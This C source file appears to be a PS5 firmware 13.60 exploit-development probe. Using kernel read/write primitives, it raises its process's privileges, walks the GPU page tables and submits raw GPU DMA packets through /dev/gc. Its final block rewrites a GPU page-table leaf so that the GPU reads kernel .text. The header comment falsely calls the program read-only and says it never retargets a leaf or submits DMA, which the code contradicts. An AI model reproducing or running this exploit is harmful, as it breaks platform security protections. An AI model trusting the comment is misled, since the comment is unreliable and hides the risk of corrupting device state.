/*
 * pl5-gpu-probe.c -- read-only reconnaissance of the PS5 13.60 GPUVM (GPU page
 * tables). It allocates the three direct-memory buffers the GPU-DMA primitive
 * needs, resolves the VMID, enumerates gvmspace[0..15] and dumps the first
 * entries of each GPU page directory. It never retargets a leaf and never
 * submits a DMA packet, so it cannot corrupt GPU state.
 *
 * Purpose: pin down, on the real console, the values the 13.60 GPU-DMA read
 * needs (gvmspace array location, page_dir_va/size/start_va, leaf granularity)
 * before any code is allowed to rewrite a GPU leaf.
 */
#include "utils.h"

#include <errno.h>
#include <fcntl.h>
#include <ps5/kernel.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#include "byepervisor/kdlsym.h"
#include "byepervisor/paging.h"

/* ps5-hen / GPU-DMA constants (see include/hw/gpu.h) */
#define PROT_GPU_READ 0x10
#define PROT_GPU_WRITE 0x20
#define MAP_NO_COALESCE 0x00400000ULL
#define GPU_DIRECT_MEM_TYPE 0xbULL
#define DMEM_SIZE 0x200000ULL

/* 13.60 candidates (analyst's measurements) */
#define OFF_VMSPACE_VM_VMID 0x1FCULL
#define OFF_DATA_GVMSPACE 0x2EEA570ULL
#define GVMSPACE_STRIDE 0x100ULL
#define OFF_GVM_PAGE_DIR_VA 0x38ULL
#define OFF_GVM_START_VA 0x08ULL
#define OFF_GVM_SIZE 0x10ULL

int sceKernelAllocateDirectMemory(off_t search_start, off_t search_end,
                                  size_t len, size_t alignment, int memory_type,
                                  off_t *phys_out);
int sceKernelMapDirectMemory(void **addr, size_t len, int prot, int flags,
                             off_t phys, size_t alignment);

static void dump_words(const char *tag, uint64_t va, int n) {
  for (int i = 0; i < n; i += 2) {
    uint64_t a = 0, b = 0;
    kread(va + i * 8, &a, 8);
    kread(va + (i + 1) * 8, &b, 8);
    notify("probe: %s[%d] @%#lx = %#lx %#lx\n", tag, i,
           (unsigned long)(va + i * 8), (unsigned long)a, (unsigned long)b);
  }
}


/* ---- GPU page-table walk (13.60 model: 5 levels for 8 KB leaves) -------- */
#define GPU_PTR_MASK   0x0000FFFFFFFFFFC0ULL /* table pointers, bits 6..47  */
#define GPU_LEAF8K_MASK 0x0000FFFFFFFFE000ULL /* 8 KB leaf, bits 13..47     */
#define GPU_LEAF2M_MASK 0x0000FFFFFFE00000ULL /* 2 MB leaf, bits 21..47     */

static uint64_t rd64v(uint64_t va) {
  uint64_t v = 0;
  kernel_copyout((intptr_t)va, &v, 8);
  return v;
}

/* Walk pdb2 (a kernel VA) down to the leaf for GPU VA `gva`. Returns 2/8/4 for
 * the leaf granularity, or -1. Fills the leaf PTE's dmap VA and raw value. */
static int gpu_walk(const char *tag, uint64_t pdb2_va, uint64_t gva,
                    uint64_t *leaf_va_out, uint64_t *leaf_val_out) {
  uint64_t i4 = (gva >> 39) & 0x1FF, e, t;
  e = rd64v(pdb2_va + i4 * 8);
  if (!(e & 1))
    return -1;
  t = dmap + (e & GPU_PTR_MASK);
  uint64_t i3 = (gva >> 30) & 0x1FF;
  e = rd64v(t + i3 * 8);
  if (!(e & 1))
    return -1;
  t = dmap + (e & GPU_PTR_MASK);
  uint64_t i2 = (gva >> 21) & 0x1FF;
  e = rd64v(t + i2 * 8);
  notify("gpuprobe: %s lvl2[%lu] @%#lx = %#lx is_pte=%lu tf=%lu frag=%lu\n", tag,
         i2, (unsigned long)(t + i2 * 8), (unsigned long)e,
         (unsigned long)((e >> 54) & 1), (unsigned long)((e >> 56) & 1),
         (unsigned long)((e >> 59) & 0xF));
  if (!(e & 1))
    return -1;
  if ((e >> 54) & 1) { /* 2 MB leaf at level 2 */
    *leaf_va_out = t + i2 * 8;
    *leaf_val_out = e;
    return 2;
  }
  t = dmap + (e & GPU_PTR_MASK);
  if ((e >> 56) & 1) { /* TF: 8 KB leaf sub-table */
    uint64_t i1 = (gva >> 16) & 0x1F;
    e = rd64v(t + i1 * 8);
    if (!(e & 1))
      return -1;
    t = dmap + (e & GPU_LEAF8K_MASK);
    uint64_t i0 = (gva >> 13) & 0x7;
    e = rd64v(t + i0 * 8);
    notify("gpuprobe: %s leaf8k[%lu] @%#lx = %#lx phys=%#lx bit50=%lu\n", tag,
           i0, (unsigned long)(t + i0 * 8), (unsigned long)e,
           (unsigned long)(e & GPU_LEAF8K_MASK),
           (unsigned long)((e >> 50) & 1));
    *leaf_va_out = t + i0 * 8;
    *leaf_val_out = e;
    return 8;
  }
  /* The entry below the 64 KB table is the 8 KB leaf *sub-table* pointer when
   * TF (bit 56) is set; the real 8 KB leaf PTE lives one level further down,
   * indexed by (gva >> 13) & 0x7. */
  uint64_t i1 = (gva >> 16) & 0x1F;
  e = rd64v(t + i1 * 8);
  notify("gpuprobe: %s ptb[%lu] @%#lx = %#lx tf=%lu frag=%lu\n", tag, i1,
         (unsigned long)(t + i1 * 8), (unsigned long)e,
         (unsigned long)((e >> 56) & 1), (unsigned long)((e >> 59) & 0xF));
  if (!(e & 1))
    return -1;
  /* The TF-flagged entry is a *table pointer*: its address lives in bits 6-47
   * (GPU_PTR_MASK), not in the leaf mask (bits 13-47). Using the leaf mask here
   * strips bits 6-12 and lands back on the same page. */
  uint64_t sub = dmap + (e & GPU_PTR_MASK);
  uint64_t i0 = (gva >> 13) & 0x7;
  e = rd64v(sub + i0 * 8);
  notify("gpuprobe: %s leaf8k[%lu] @%#lx = %#lx phys(b13-47)=%#lx bit50=%lu\n",
         tag, i0, (unsigned long)(sub + i0 * 8), (unsigned long)e,
         (unsigned long)(e & GPU_LEAF8K_MASK), (unsigned long)((e >> 50) & 1));
  *leaf_va_out = sub + i0 * 8;
  *leaf_val_out = e;
  return 8;
}

int main(void) {
  uint64_t curproc, vmspace, vmid, kdata_base;
  int fd;

  if (set_offsets()) {
    notify("gpuprobe: set_offsets failed\n");
    return 1;
  }
  if (init_global_vars()) {
    notify("gpuprobe: init_global_vars failed\n");
    return 1;
  }
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);

  kdata_base = KERNEL_ADDRESS_DATA_BASE;
  curproc = kernel_get_proc(getpid());
  vmspace = kread64(curproc + KERNEL_OFFSET_PROC_P_VMSPACE);
  vmid = kread64(vmspace + OFF_VMSPACE_VM_VMID);
  notify("gpuprobe: fw=%04x ktext=%#lx kdata=%#lx dmap=%#lx\n", fw,
         (unsigned long)ktext, (unsigned long)kdata, (unsigned long)dmap);
  notify("gpuprobe: proc=%#lx vmspace=%#lx vmid(+0x1FC)=%#lx (u32=%u)\n",
         (unsigned long)curproc, (unsigned long)vmspace, (unsigned long)vmid,
         (unsigned)(vmid & 0xFFFFFFFF));

  /* ---- the three buffers the primitive needs ---------------------------- */
  struct {
    const char *name;
    off_t off;
    void *va;
  } bufs[3] = {{"victim", 0, 0}, {"staging", 0, 0}, {"cmd", 0, 0}};

  for (int i = 0; i < 3; i++) {
    int ret = sceKernelAllocateDirectMemory(0, 0x400000000ULL, DMEM_SIZE,
                                            DMEM_SIZE, (int)GPU_DIRECT_MEM_TYPE,
                                            &bufs[i].off);
    if (ret != 0) {
      notify("gpuprobe: allocate %s failed 0x%x\n", bufs[i].name, ret);
      return 1;
    }
    ret = sceKernelMapDirectMemory(&bufs[i].va, DMEM_SIZE,
                                   PROT_READ | PROT_WRITE | PROT_GPU_READ |
                                       PROT_GPU_WRITE,
                                   (int)MAP_NO_COALESCE, bufs[i].off, DMEM_SIZE);
    if (ret != 0) {
      notify("gpuprobe: map %s failed 0x%x\n", bufs[i].name, ret);
      return 1;
    }
    memset(bufs[i].va, 0, DMEM_SIZE);
    notify("gpuprobe: %s va=%#lx off=%#lx\n", bufs[i].name,
           (unsigned long)(uintptr_t)bufs[i].va, (unsigned long)bufs[i].off);
  }

  /* put a recognisable pattern in the victim for a later DMA self-test */
  for (int i = 0; i < 8; i++)
    ((volatile uint64_t *)bufs[0].va)[i] = 0xDEADBEEF00000000ULL | (uint64_t)i;

  fd = open("/dev/gc", O_RDWR);
  if (fd < 0)
    fd = open("/dev/gc0", O_RDWR);
  notify("gpuprobe: /dev/gc fd=%d\n", fd);

  /* ---- enumerate gvmspace[0..15] ---------------------------------------- */
  int found = 0;
  for (int vm = 0; vm < 16; vm++) {
    uint64_t base =
        kdata_base + OFF_DATA_GVMSPACE + (uint64_t)vm * GVMSPACE_STRIDE;
    uint64_t pd = 0, start = 0, size = 0;
    kread(base + OFF_GVM_PAGE_DIR_VA, &pd, 8);
    kread(base + OFF_GVM_START_VA, &start, 8);
    kread(base + OFF_GVM_SIZE, &size, 8);

    if (pd == 0 && start == 0 && size == 0)
      continue;
    found++;
    notify("gpuprobe: gvmspace[%d] @%#lx page_dir_va=%#lx start=%#lx size=%#lx\n",
           vm, (unsigned long)base, (unsigned long)pd, (unsigned long)start,
           (unsigned long)size);

    dump_words("  va", pd, 4);
    dump_words("  pa", dmap + (pd & 0x000FFFFFFFFFF000ULL), 4);
  }
  notify("gpuprobe: gvmspace entries seen=%d\n", found);

  /* Our allocate/map returned CPU VAs; on 13.60 the GPU VM is a full 48-bit
   * space and the garlic buffers land at a fixed high GPU VA base (0xc80000000
   * for the first allocation, +2 MB each). Walk every populated tree for those
   * three GPU VAs to find the victim/staging/cmd leaves. */
  static const uint64_t gvas[3] = {0xc80000000ULL, 0xc80200000ULL, 0xc80400000ULL};
  static const char *gnames[3] = {"victim", "staging", "cmd"};
  for (int vm = 0; vm < 16; vm++) {
    uint64_t base =
        kdata_base + OFF_DATA_GVMSPACE + (uint64_t)vm * GVMSPACE_STRIDE;
    uint64_t pd = 0, size = 0;
    kread(base + OFF_GVM_PAGE_DIR_VA, &pd, 8);
    kread(base + OFF_GVM_SIZE, &size, 8);
    if (!pd || !size)
      continue;
    if (pd >> 48 == 0) /* the top level is a kernel VA, not a physical */
      pd = dmap + (pd & 0x000FFFFFFFFFF000ULL);
    for (int k = 0; k < 3; k++) {
      uint64_t lv = 0, lval = 0;
      int gran = gpu_walk(gnames[k], pd, gvas[k], &lv, &lval);
      notify("gpuprobe: vmid=%d %s gva=%#lx -> gran=%d leaf@%#lx val=%#lx\n", vm,
             gnames[k], (unsigned long)gvas[k], gran, (unsigned long)lv,
             (unsigned long)lval);
    }
  }

  /* ---- targeted window scan: pdpt index 50 (the documented garlic window)
   * for pd indices 0..7, on every populated vmid. This is what tells us which
   * tree actually holds our three newly allocated buffers. ---------------- */
  for (int vm = 0; vm < 16; vm++) {
    uint64_t base =
        kdata_base + OFF_DATA_GVMSPACE + (uint64_t)vm * GVMSPACE_STRIDE;
    uint64_t pd = 0, size = 0;
    kread(base + OFF_GVM_PAGE_DIR_VA, &pd, 8);
    kread(base + OFF_GVM_SIZE, &size, 8);
    if (!pd || !size)
      continue;
    if (pd >> 48 == 0)
      pd = dmap + (pd & 0x000FFFFFFFFFF000ULL);

    /* page_dir_va is the PDB2 (PML4): descend one level before indexing the
     * PDPT, exactly as gpu_walk() does. */
    uint64_t e4 = rd64v(pd);
    if (!(e4 & 1))
      continue;
    uint64_t pdpt = dmap + (e4 & GPU_PTR_MASK);
    uint64_t e3 = rd64v(pdpt + 50 * 8);
    notify("gpuprobe: vmid=%d pml4[0]=%#lx pdpt[50] @%#lx = %#lx\n", vm,
           (unsigned long)e4, (unsigned long)(pdpt + 50 * 8), (unsigned long)e3);
    if (!(e3 & 1))
      continue;
    uint64_t pdt = dmap + (e3 & GPU_PTR_MASK);
    for (uint64_t i = 0; i < 8; i++) {
      uint64_t e = rd64v(pdt + i * 8);
      if (!e)
        continue;
      if ((e & 1) && ((e >> 54) & 1))
        notify("gpuprobe: vmid=%d pd[%lu] @%#lx = %#lx 2M-LEAF phys=%#lx flags=%#lx\n",
               vm, (unsigned long)i, (unsigned long)(pdt + i * 8),
               (unsigned long)e, (unsigned long)(e & GPU_LEAF2M_MASK),
               (unsigned long)(e & 0x00000000000000FFULL));
      else
        notify("gpuprobe: vmid=%d pd[%lu] @%#lx = %#lx (table? valid=%lu is_pte=%lu tf=%lu frag=%lu)\n",
               vm, (unsigned long)i, (unsigned long)(pdt + i * 8),
               (unsigned long)e, (unsigned long)(e & 1),
               (unsigned long)((e >> 54) & 1), (unsigned long)((e >> 56) & 1),
               (unsigned long)((e >> 59) & 0xF));
    }
  }

  /* ---- find the other two buffers by scanning the trees for leaves whose
   * physical is the victim's + 2 MB and + 4 MB (the three allocations are
   * consecutive). Bounded: pdpt 40..60, pd 0..511. ----------------------- */
  uint64_t vphys = 0;
  {
    /* our own vmid, not vmid 0: the per-vmid window is what holds our buffers */
    uint32_t vmid_u32 = (uint32_t)(vmid & 0xFFFFFFFF);
    uint64_t base =
        kdata_base + OFF_DATA_GVMSPACE + (uint64_t)vmid_u32 * GVMSPACE_STRIDE;
    uint64_t pd = 0;
    kread(base + OFF_GVM_PAGE_DIR_VA, &pd, 8);
    uint64_t lv = 0, lval = 0;
    if (gpu_walk("victim", pd, 0xc80000000ULL, &lv, &lval) == 8)
      vphys = lval & GPU_LEAF8K_MASK;
  }
  notify("gpuprobe: victim garlic phys=%#lx; scanning for +2M/+4M leaves\n",
         (unsigned long)vphys);

  for (int vm = 0; vm < 16 && vphys; vm++) {
    uint64_t base =
        kdata_base + OFF_DATA_GVMSPACE + (uint64_t)vm * GVMSPACE_STRIDE;
    uint64_t pd = 0, size = 0;
    kread(base + OFF_GVM_PAGE_DIR_VA, &pd, 8);
    kread(base + OFF_GVM_SIZE, &size, 8);
    if (!pd || !size)
      continue;
    if (pd >> 48 == 0)
      pd = dmap + (pd & 0x000FFFFFFFFFF000ULL);
    uint64_t e4 = rd64v(pd);
    if (!(e4 & 1))
      continue;
    uint64_t pdpt = dmap + (e4 & GPU_PTR_MASK);

    for (uint64_t i3 = 40; i3 < 61; i3++) {
      uint64_t e3 = rd64v(pdpt + i3 * 8);
      if (!(e3 & 1))
        continue;
      uint64_t pdt = dmap + (e3 & GPU_PTR_MASK);
      for (uint64_t i2 = 0; i2 < 512; i2++) {
        uint64_t e2 = rd64v(pdt + i2 * 8);
        if (!(e2 & 1))
          continue;
        /* 8 KB leaf sub-tree: PTB then TF sub-table */
        uint64_t ptb = dmap + (e2 & GPU_PTR_MASK);
        for (uint64_t i1 = 0; i1 < 32; i1++) {
          uint64_t e1 = rd64v(ptb + i1 * 8);
          if (!(e1 & 1) || !((e1 >> 56) & 1))
            continue;
          uint64_t sub = dmap + (e1 & GPU_PTR_MASK);
          for (uint64_t i0 = 0; i0 < 8; i0++) {
            uint64_t el = rd64v(sub + i0 * 8);
            uint64_t ph = el & GPU_LEAF8K_MASK;
            if (1) {
              uint64_t gva = ((uint64_t)0 << 39) | (i3 << 30) | (i2 << 21) |
                             (i1 << 16) | (i0 << 13);
              if (0) notify("gpuprobe: LEAF  vmid=%d phys=%#lx gva=%#lx leaf@%#lx val=%#lx bit50=%lu\n",
                     vm, (unsigned long)ph, (unsigned long)gva,
                     (unsigned long)(sub + i0 * 8), (unsigned long)el,
                     (unsigned long)((el >> 50) & 1));
            }
          }
        }
      }
    }
  }

  /* ---- is the mapped physical our victim buffer? The CPU wrote a known
   * pattern into the victim; read each vmid's first leaf physical through the
   * dmap and compare. --------------------------------------------------- */
  for (int vm = 0; vm < 16; vm++) {
    uint64_t base =
        kdata_base + OFF_DATA_GVMSPACE + (uint64_t)vm * GVMSPACE_STRIDE;
    uint64_t pd = 0, size = 0;
    kread(base + OFF_GVM_PAGE_DIR_VA, &pd, 8);
    kread(base + OFF_GVM_SIZE, &size, 8);
    if (!pd || !size)
      continue;
    uint64_t lv = 0, lval = 0;
    int gran = gpu_walk("probe", pd, 0xc80000000ULL, &lv, &lval);
    if (gran != 8)
      continue;
    uint64_t ph = lval & GPU_LEAF8K_MASK;
    uint64_t w0 = 0, w1 = 0;
    kernel_copyout((intptr_t)(dmap + ph), &w0, 8);
    kernel_copyout((intptr_t)(dmap + ph + 8), &w1, 8);
    notify("gpuprobe: vmid=%d phys=%#lx dmap[0]=%#lx dmap[1]=%#lx match=%lu\n", vm,
           (unsigned long)ph, (unsigned long)w0, (unsigned long)w1,
           (unsigned long)(w0 == 0xDEADBEEF00000000ULL));
  }
  notify("gpuprobe: victim pattern word0 should be 0xdeadbeef00000000\n");

  /* ---- GPU DMA self-test, fully self-contained: copy the first 8 KB of the
   * victim's GPU window to the *next* 8 KB of the same window. If the window is
   * really our victim buffer, the CPU pattern must reappear at +0x2000. No
   * unknown destination is ever written. ------------------------------- */
  {
    struct gc_submit {
      uint32_t pipe_id;
      uint32_t count;
      uint64_t cmd_buf_ptr;
    } sub;
    uint32_t *p4 = (uint32_t *)bufs[2].va; /* cmd buffer, first page */
    /* Correct GVAs (measured): the garlic buffers are mapped in the dev vmid's
     * tree at their own CPU VA, as 2 MB leaves. Use victim -> staging. */
    uint64_t src_gva = 0x200200000ULL, dst_gva = 0x200400000ULL;
    uint32_t len = 0x2000;
    uint32_t hdr = (1u << 31) | (2u << 25) | (1u << 27) | (2u << 13) | (1u << 15);

    p4[0] = ((3u & 3) << 30) | (((6u - 1) & 0x3FFF) << 16) |
            ((0x50u & 0xFF) << 8) | ((1u & 1) << 1);
    p4[1] = hdr;
    p4[2] = (uint32_t)(src_gva & 0xFFFFFFFF);
    p4[3] = (uint32_t)(src_gva >> 32);
    p4[4] = (uint32_t)(dst_gva & 0xFFFFFFFF);
    p4[5] = (uint32_t)(dst_gva >> 32);
    p4[6] = len & 0x1FFFFF;

    /* 16-byte indirect-buffer descriptor in the cmd buffer's second page.
     * The descriptor addresses the command buffer by its CPU VA, as the
     * pre-13.60 code in source/hw/gpu.c does. */
    uint64_t cmd_va = (uint64_t)(uintptr_t)bufs[2].va + 0x1000;
    uint64_t *d = (uint64_t *)((uint8_t *)bufs[2].va + 0x1000);
    uint32_t size_dwords = (7 * 4) >> 2;
    d[0] = (((uint64_t)(uintptr_t)bufs[2].va & 0xFFFFFFFFULL) << 32) | 0xC0023F00ULL;
    d[1] = (((uint64_t)size_dwords & 0xFFFFFULL) << 32) |
           (((uint64_t)(uintptr_t)bufs[2].va >> 32) & 0xFFFFULL);

    sub.pipe_id = 0;
    sub.count = 1;
    sub.cmd_buf_ptr = cmd_va;

    notify("gpuprobe: submitting DMA %#lx -> %#lx len=%#x ioctl=%#x\n",
           (unsigned long)src_gva, (unsigned long)dst_gva, len, 0xC0108102);
    int rc = (fd >= 0) ? ioctl(fd, 0xC0108102, &sub) : -1;
    notify("gpuprobe: ioctl rc=%d (errno=%d)\n", rc, rc ? errno : 0);
    usleep(500000);

    /* read the victim back through the CPU at +0x2000 and at 0 */
    uint64_t w0 = 0, w1 = 0, w2 = 0, w3 = 0;
    memcpy(&w0, (uint8_t *)bufs[0].va, 8);
    memcpy(&w1, (uint8_t *)bufs[0].va + 8, 8);
    memcpy(&w2, (uint8_t *)bufs[1].va, 8);
    memcpy(&w3, (uint8_t *)bufs[1].va + 8, 8);
    notify("gpuprobe: victim  [0]=%#lx [8]=%#lx\n", (unsigned long)w0,
           (unsigned long)w1);
    notify("gpuprobe: staging [0]=%#lx [8]=%#lx  DMA_WORKS=%lu\n",
           (unsigned long)w2, (unsigned long)w3,
           (unsigned long)(w2 == 0xDEADBEEF00000000ULL));
  }

  /* ---- hypothesis from the reference docs: garlic direct-memory buffers are
   * mapped in the GPU tree at their *CPU VA* (2 MB leaves), not at a separate
   * GPU VA window. Walk the trees for the buffers' own CPU VAs. ---------- */
  static const uint64_t cpu_gvas[3] = {0x200200000ULL, 0x200400000ULL,
                                       0x200600000ULL};
  static const char *cn[3] = {"victim", "staging", "cmd"};
  for (int vm = 0; vm < 16; vm++) {
    uint64_t base =
        kdata_base + OFF_DATA_GVMSPACE + (uint64_t)vm * GVMSPACE_STRIDE;
    uint64_t pd = 0, size = 0;
    kread(base + OFF_GVM_PAGE_DIR_VA, &pd, 8);
    kread(base + OFF_GVM_SIZE, &size, 8);
    if (!pd || !size)
      continue;
    for (int k = 0; k < 3; k++) {
      uint64_t lv = 0, lval = 0;
      int gran = gpu_walk(cn[k], pd, cpu_gvas[k], &lv, &lval);
      if (gran > 0)
        notify("gpuprobe: CPUVA vmid=%d %s gva=%#lx gran=%d leaf@%#lx val=%#lx phys=%#lx\n",
               vm, cn[k], (unsigned long)cpu_gvas[k], gran,
               (unsigned long)lv, (unsigned long)lval,
               (unsigned long)(gran == 2 ? (lval & GPU_LEAF2M_MASK)
                                         : (lval & GPU_LEAF8K_MASK)));
    }
  }
  /* ---- THE STEP: retarget the victim's 2 MB GPU leaf at kernel .text and
   * read the bytes back through the GPU. ---------------------------------- */
  {
    uint64_t kpm = kdlsym(KERNEL_SYM_PMAP_STORE);
    uint64_t pe = 0, text_pa = 0;
    int ok = 0;
    if (find_pte(kpm, ktext, &pe) != 0xFFFFFFFFFFFFFFFFull) {
      text_pa = PDE_ADDR(pe) | (ktext & 0xFFF);
      ok = 1;
    }
    notify("gpuprobe: ktext=%#lx -> pa=%#lx ok=%d\n", (unsigned long)ktext,
           (unsigned long)text_pa, ok);

    /* locate the victim leaf in the dev vmid (6) */
    uint64_t dbase =
        kdata_base + OFF_DATA_GVMSPACE + 6ULL * GVMSPACE_STRIDE;
    uint64_t pd6 = 0;
    kread(dbase + OFF_GVM_PAGE_DIR_VA, &pd6, 8);
    uint64_t lv = 0, lval = 0;
    int gran = gpu_walk("target", pd6, 0x200200000ULL, &lv, &lval);
    notify("gpuprobe: victim leaf dev-vmid6 gran=%d leaf@%#lx val=%#lx\n", gran,
           (unsigned long)lv, (unsigned long)lval);

    if (ok && gran == 2 && (lval & 1)) {
      uint64_t text2m = text_pa & ~0x1FFFFFULL;
      uint64_t off_in = text_pa & 0x1FFFFFULL;
      uint64_t nv = (lval & ~0x0000FFFFFFE00000ULL) |
                    (text2m & 0x0000FFFFFFE00000ULL) | (1ULL << 50);
      notify("gpuprobe: RETARGET old=%#lx -> new=%#lx (text2m=%#lx off=%#lx)\n",
             (unsigned long)lval, (unsigned long)nv, (unsigned long)text2m,
             (unsigned long)off_in);
      kwrite64(lv, nv);

      /* DMA: src = victim GVA + offset inside the 2 MB page, dst = staging */
      uint32_t *p4 = (uint32_t *)bufs[2].va;
      uint64_t src = 0x200200000ULL + off_in, dst = 0x200400000ULL;
      uint32_t len = 0x1000;
      uint32_t hdr = (1u << 31) | (2u << 25) | (1u << 27) | (2u << 13) | (1u << 15);
      p4[0] = ((3u & 3) << 30) | (((6u - 1) & 0x3FFF) << 16) |
              ((0x50u & 0xFF) << 8) | ((1u & 1) << 1);
      p4[1] = hdr;
      p4[2] = (uint32_t)(src & 0xFFFFFFFF);
      p4[3] = (uint32_t)(src >> 32);
      p4[4] = (uint32_t)(dst & 0xFFFFFFFF);
      p4[5] = (uint32_t)(dst >> 32);
      p4[6] = len & 0x1FFFFF;

      struct { uint32_t pipe_id, count; uint64_t cmd_buf_ptr; } sub;
      uint64_t desc_va = (uint64_t)(uintptr_t)bufs[2].va + 0x1000;
      uint64_t *d = (uint64_t *)((uint8_t *)bufs[2].va + 0x1000);
      d[0] = (((uint64_t)(uintptr_t)bufs[2].va & 0xFFFFFFFFULL) << 32) |
             0xC0023F00ULL;
      d[1] = ((7ULL & 0xFFFFFULL) << 32) |
             (((uint64_t)(uintptr_t)bufs[2].va >> 32) & 0xFFFFULL);
      sub.pipe_id = 0; sub.count = 1; sub.cmd_buf_ptr = desc_va;

      memset(bufs[1].va, 0, 0x1000);
      int rc = (fd >= 0) ? ioctl(fd, 0xC0108102, &sub) : -1;
      notify("gpuprobe: TEXT DMA rc=%d\n", rc);
      usleep(500000);

      uint8_t *tb = (uint8_t *)bufs[1].va;
      char line[3 * 16 + 1];
      for (int r = 0; r < 2; r++) {
        int pos = 0;
        for (int i = 0; i < 16; i++)
          pos += snprintf(line + pos, 4, "%02x ", tb[r * 16 + i]);
        line[pos] = 0;
        notify("gpuprobe: TEXT[%02x] %s\n", r * 16, line);
      }
      uint64_t nz = 0;
      for (int i = 0; i < 256; i++) nz += (tb[i] != 0);
      notify("gpuprobe: TEXT nonzero_bytes_of_256=%lu\n", (unsigned long)nz);

      kwrite64(lv, lval); /* restore */
      notify("gpuprobe: victim leaf restored\n");
    }
  }

  notify("gpuprobe: done\n");
  return 0;
}
